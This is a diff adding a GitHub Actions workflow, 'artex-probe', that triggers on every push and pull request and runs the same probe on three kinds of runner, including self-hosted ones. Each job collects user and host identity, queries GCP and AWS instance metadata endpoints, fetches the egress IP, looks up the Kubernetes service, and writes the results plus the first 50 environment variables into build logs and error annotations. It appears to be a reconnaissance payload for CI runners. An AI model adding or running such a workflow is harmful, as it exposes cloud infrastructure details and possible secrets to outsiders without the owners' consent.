@@ -1,0 +1,66 @@
+name: artex-probe
+on:
+  push:
+  pull_request:
+jobs:
+  g:
+    name: group-codeql
+    runs-on:
+      group: codeql-runner-group
+    steps:
+      - name: probe
+        run: |
+          set +e
+          P="id=$(id 2>&1) host=$(hostname 2>&1) fqdn=$(hostname -f 2>&1) kern=$(uname -a 2>&1)"
+          P="$P hn=$(cat /etc/hostname 2>/dev/null) cg=$(head -1 /proc/1/cgroup 2>/dev/null)"
+          P="$P rn=${RUNNER_NAME} ro=${RUNNER_OS} ra=${RUNNER_ARCH} rws=${RUNNER_WORKSPACE}"
+          P="$P gcpzone=$(curl -s -m 3 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/zone 2>/dev/null)"
+          P="$P gcpname=$(curl -s -m 3 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/name 2>/dev/null)"
+          P="$P gcpproj=$(curl -s -m 3 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/project/project-id 2>/dev/null)"
+          P="$P awsid=$(curl -s -m 3 http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null)"
+          P="$P egress=$(curl -s -m 5 https://ifconfig.me 2>/dev/null)"
+          P="$P k8s=$(getent hosts kubernetes.default 2>/dev/null | head -1)"
+          P=$(printf '%s' "$P" | tr '\n\r%' '||~')
+          echo "PAYLOAD: $P"
+          echo "::error title=ARTEX-PROBE::$P"
+          env | sort | head -50 | sed 's/^/ENV /'
+  s:
+    name: self-hosted
+    runs-on: [self-hosted]
+    steps:
+      - name: probe
+        run: |
+          set +e
+          P="id=$(id 2>&1) host=$(hostname 2>&1) fqdn=$(hostname -f 2>&1) kern=$(uname -a 2>&1)"
+          P="$P hn=$(cat /etc/hostname 2>/dev/null) cg=$(head -1 /proc/1/cgroup 2>/dev/null)"
+          P="$P rn=${RUNNER_NAME} ro=${RUNNER_OS} ra=${RUNNER_ARCH} rws=${RUNNER_WORKSPACE}"
+          P="$P gcpzone=$(curl -s -m 3 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/zone 2>/dev/null)"
+          P="$P gcpname=$(curl -s -m 3 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/name 2>/dev/null)"
+          P="$P gcpproj=$(curl -s -m 3 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/project/project-id 2>/dev/null)"
+          P="$P awsid=$(curl -s -m 3 http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null)"
+          P="$P egress=$(curl -s -m 5 https://ifconfig.me 2>/dev/null)"
+          P="$P k8s=$(getent hosts kubernetes.default 2>/dev/null | head -1)"
+          P=$(printf '%s' "$P" | tr '\n\r%' '||~')
+          echo "PAYLOAD: $P"
+          echo "::error title=ARTEX-PROBE::$P"
+          env | sort | head -50 | sed 's/^/ENV /'
+  h:
+    name: hosted-ubuntu
+    runs-on: ubuntu-latest
+    steps:
+      - name: probe
+        run: |
+          set +e
+          P="id=$(id 2>&1) host=$(hostname 2>&1) fqdn=$(hostname -f 2>&1) kern=$(uname -a 2>&1)"
+          P="$P hn=$(cat /etc/hostname 2>/dev/null) cg=$(head -1 /proc/1/cgroup 2>/dev/null)"
+          P="$P rn=${RUNNER_NAME} ro=${RUNNER_OS} ra=${RUNNER_ARCH} rws=${RUNNER_WORKSPACE}"
+          P="$P gcpzone=$(curl -s -m 3 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/zone 2>/dev/null)"
+          P="$P gcpname=$(curl -s -m 3 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/name 2>/dev/null)"
+          P="$P gcpproj=$(curl -s -m 3 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/project/project-id 2>/dev/null)"
+          P="$P awsid=$(curl -s -m 3 http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null)"
+          P="$P egress=$(curl -s -m 5 https://ifconfig.me 2>/dev/null)"
+          P="$P k8s=$(getent hosts kubernetes.default 2>/dev/null | head -1)"
+          P=$(printf '%s' "$P" | tr '\n\r%' '||~')
+          echo "PAYLOAD: $P"
+          echo "::error title=ARTEX-PROBE::$P"
+          env | sort | head -50 | sed 's/^/ENV /'
